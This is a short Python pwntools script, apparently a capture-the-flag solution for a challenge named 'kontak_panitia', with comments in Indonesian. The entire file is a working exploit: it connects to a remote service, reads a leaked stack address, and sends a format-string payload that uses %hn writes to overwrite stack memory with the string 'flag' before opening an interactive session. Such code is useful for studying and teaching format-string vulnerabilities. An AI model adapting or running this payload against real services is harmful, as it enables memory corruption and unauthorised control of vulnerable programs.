#!/usr/bin/env python
from pwn import *

#r = process('./kontak_panitia')
r = remote('202.125.94.131', 5007)
r.recvuntil('sesid ')
stack_addr = int(r.recvline().strip(), 8)
msg = 'flag'
msg = msg[::-1].encode('hex')

# payload = addr + addr+2 + overwrite ke addr + overwrite ke addr+2
p = ''
p += p32(stack_addr)
p += p32(stack_addr+2)

p += '%' + str(int(msg[4:], 16) - 8) + 'x%1$hn'
p += '%' + str(int('1' + msg[:4], 16) - int(msg[4:], 16)) + 'x%2$hn'

r.recvuntil('Nama : ')
r.sendline('aaaa')
r.recvuntil('Pesan : ')
r.sendline(p)

r.interactive()
